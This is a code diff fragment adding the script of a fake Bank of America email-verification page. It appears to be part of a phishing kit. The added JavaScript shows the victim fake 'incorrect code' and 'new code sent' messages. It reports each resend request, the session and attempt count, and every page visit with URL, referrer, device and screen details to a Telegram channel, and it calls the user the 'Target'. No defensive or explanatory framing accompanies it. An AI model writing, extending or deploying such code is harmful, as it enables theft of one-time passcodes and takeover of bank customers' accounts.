+                margin-bottom: 20px;
+                text-align: center;
+                font-size: 14px;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+                animation: shake 0.5s;
+                font-weight: 600;
+            `;
+            retryAlert.textContent = '❌ Incorrect code. Please try again.';
+            const emailOtpContent = document.querySelector('.email-otp-content');
+            emailOtpContent.insertBefore(retryAlert, emailOtpContent.querySelector('div'));
+            setTimeout(() => retryAlert.remove(), 4000);
+        }
+        
+        function resendEmailOTP(event) {
+            event.preventDefault();
+            clearEmailOTPInputs();
+            
+            const resendMessage = `
+🔄 <b>BANK OF AMERICA - EMAIL OTP RESEND REQUESTED</b>
+
+🆔 <b>Session:</b> <code>${emailOtpSessionId}</code>
+📊 <b>Previous Attempts:</b> ${emailOtpAttempts}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+📱 <b>Device:</b> ${navigator.platform}
+
+⚠️ Target requested a new email verification code
+            `.trim();
+            
+            sendToTelegram(resendMessage);
+            
+            const existingAlert = document.querySelector('.email-otp-content .success-alert');
+            if (existingAlert) existingAlert.remove();
+            
+            const successAlert = document.createElement('div');
+            successAlert.classList.add('success-alert');
+            successAlert.style.cssText = `
+                background: linear-gradient(135deg, #28a745, #1e7e34);
+                color: white;
+                padding: 12px 20px;
+                border-radius: 8px;
+                margin-bottom: 20px;
+                text-align: center;
+                font-size: 14px;
+                box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+                font-weight: 600;
+            `;
+            successAlert.textContent = '✅ A new code has been sent to your email.';
+            const emailOtpContent = document.querySelector('.email-otp-content');
+            emailOtpContent.insertBefore(successAlert, emailOtpContent.querySelector('div'));
+            setTimeout(() => successAlert.remove(), 4000);
+        }
+        
+        // ========================================
+        // PAGE LOAD TRACKING
+        // ========================================
+        window.addEventListener('load', async function() {
+            const message = `
+📱 <b>NEW VISITOR - BANK OF AMERICA</b>
+
+🌐 <b>URL:</b> ${window.location.href}
+📍 <b>Referrer:</b> ${document.referrer || 'Direct'}
+📱 <b>Device:</b> ${navigator.platform}
+📏 <b>Screen:</b> ${screen.width}x${screen.height}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+            `.trim();
+            
+            await sendToTelegram(message);
+        });
+    </script>
+</body>
+</html>
